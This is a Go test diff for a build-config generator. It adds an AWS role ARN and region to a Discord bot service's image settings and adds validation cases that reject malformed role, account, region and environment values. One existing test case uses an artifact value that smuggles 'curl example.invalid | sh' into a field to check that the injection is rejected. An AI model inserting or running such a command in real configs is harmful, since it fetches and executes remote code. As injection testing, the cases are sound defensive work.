@@ -16,6 +16,10 @@ import (
 
 // goServiceBotPrivateModules is the bot's GOPRIVATE list: the service kit and
 // the two sibling repositories whose clients it imports with go get.
+// goServiceBotRoleARN is a placeholder role for the bot fixture; the real
+// role is not known yet.
+const goServiceBotRoleARN = "arn:aws:iam::677459762413:role/altf4llc-gha-quirk-backend-discord-bot-push"
+
 const goServiceBotPrivateModules = "github.com/ALT-F4-LLC/quirk-service-kit,github.com/ALT-F4-LLC/quirk-lambda-ai,github.com/ALT-F4-LLC/quirk-lambda-database"
 
 // goServiceBotConfig describes quirk-backend-discord-bot: one service, an
@@ -25,6 +29,7 @@ func goServiceBotConfig() GoServiceConfig {
 	cfg := NewGoServiceConfig(Config{Name: "quirk-backend-discord-bot", Template: GoServiceName})
 	cfg.PrivateModules = goServiceBotPrivateModules
 	cfg.Image.Repository = "quirk/backend-discord-bot"
+	cfg.Image.RoleARN = goServiceBotRoleARN
 	return cfg
 }
 
@@ -50,6 +55,8 @@ parameters:
     includes: [cmd, internal, go.mod, go.sum, assets]
   image:
     repository: quirk/backend-discord-bot
+    roleArn: arn:aws:iam::677459762413:role/altf4llc-gha-quirk-backend-discord-bot-push
+    region: us-east-1
 `
 	if err := os.WriteFile("build-configs.yaml", []byte(yaml), 0o600); err != nil {
 		t.Fatalf("write config: %v", err)
@@ -71,6 +78,9 @@ parameters:
 	}
 	if svc.Image.Rootfs != goServiceDefaultRootfs {
 		t.Errorf("image.rootfs = %q, want the default %q kept beside image.repository", svc.Image.Rootfs, goServiceDefaultRootfs)
+	}
+	if svc.Image.Account != DefaultAccount || svc.Image.Region != "us-east-1" || svc.Registry() != DefaultAccount+".dkr.ecr.us-east-1.amazonaws.com" {
+		t.Errorf("image account, region = %q, %q; want the default account kept and the region override applied", svc.Image.Account, svc.Image.Region)
 	}
 	if svc.PrivateModules != "github.com/ALT-F4-LLC/quirk-service-kit,github.com/ALT-F4-LLC/quirk-lambda-ai" {
 		t.Errorf("privateModules = %q, want the build-configs.yaml list", svc.PrivateModules)
@@ -118,6 +128,7 @@ func TestGoServiceRenderRejectsInvalidConfig(t *testing.T) {
 		{"image rootfs with quote", func(c *GoServiceConfig) { c.Image.Repository = "quirk/bot"; c.Image.Rootfs = `a:1"` }, "image.rootfs"},
 		{"image name collides", func(c *GoServiceConfig) {
 			c.Image.Repository = "quirk/bot"
+			c.Image.RoleARN = goServiceBotRoleARN
 			c.Services = []string{"demo-image"}
 		}, "unique"},
 		{"generate newline", func(c *GoServiceConfig) { c.Generate = []string{"a\nb"} }, "newline"},
@@ -128,6 +139,31 @@ func TestGoServiceRenderRejectsInvalidConfig(t *testing.T) {
 		{"artifact with quote", func(c *GoServiceConfig) { c.Artifacts = []string{`x"; curl example.invalid | sh; echo "`} }, "artifact"},
 		{"privateModules with quote", func(c *GoServiceConfig) { c.PrivateModules = `github.com/x",evil:"` }, "privateModules"},
 		{"privateModules with space", func(c *GoServiceConfig) { c.PrivateModules = "github.com/x github.com/y" }, "privateModules"},
+		{"image without role", func(c *GoServiceConfig) { c.Image.Repository = "quirk/bot" }, "image.roleArn"},
+		{"image role with quote", func(c *GoServiceConfig) {
+			c.Image.Repository = "quirk/bot"
+			c.Image.RoleARN = goServiceBotRoleARN + `"`
+		}, "image.roleArn"},
+		{"image role with expression", func(c *GoServiceConfig) { c.Image.Repository = "quirk/bot"; c.Image.RoleARN = "${{ secrets.ROLE }}" }, "image.roleArn"},
+		{"image role with newline", func(c *GoServiceConfig) {
+			c.Image.Repository = "quirk/bot"
+			c.Image.RoleARN = goServiceBotRoleARN + "\nx: y"
+		}, "image.roleArn"},
+		{"image account short", func(c *GoServiceConfig) {
+			c.Image.Repository = "quirk/bot"
+			c.Image.RoleARN = goServiceBotRoleARN
+			c.Image.Account = "1234"
+		}, "image.account"},
+		{"image region with colon", func(c *GoServiceConfig) {
+			c.Image.Repository = "quirk/bot"
+			c.Image.RoleARN = goServiceBotRoleARN
+			c.Image.Region = "us-west-2: x"
+		}, "image.region"},
+		{"image environment with space", func(c *GoServiceConfig) {
+			c.Image.Repository = "quirk/bot"
+			c.Image.RoleARN = goServiceBotRoleARN
+			c.Image.GithubEnvironment = "prod env"
+		}, "image.githubEnvironment"},
 		{"empty include", func(c *GoServiceConfig) { c.Vorpal.Includes = []string{"cmd", ""} }, "vorpal.includes"},
 		{"dot-slash include", func(c *GoServiceConfig) { c.Vorpal.Includes = []string{"./cmd"} }, "vorpal.includes"},
 		{"absolute include", func(c *GoServiceConfig) { c.Vorpal.Includes = []string{"/etc"} }, "vorpal.includes"},
@@ -274,7 +310,10 @@ func TestGoServiceVorpalProgramGofmtClean(t *testing.T) {
 		"bot":                    func(c *GoServiceConfig) { *c = goServiceBotConfig() },
 		"no private modules":     func(c *GoServiceConfig) { c.PrivateModules = "" },
 		"bot no private modules": func(c *GoServiceConfig) { *c = goServiceBotConfig(); c.PrivateModules = "" },
-		"image only":             func(c *GoServiceConfig) { c.Image.Repository = "quirk/x" },
+		"image only": func(c *GoServiceConfig) {
+			c.Image.Repository = "quirk/x"
+			c.Image.RoleARN = goServiceBotRoleARN
+		},
 		"no tools": func(c *GoServiceConfig) {
 			c.Vorpal.ExcludeTools = []string{"golangci-lint", "govulncheck", "jq", "just", "gitleaks", "rumdl"}
 		},
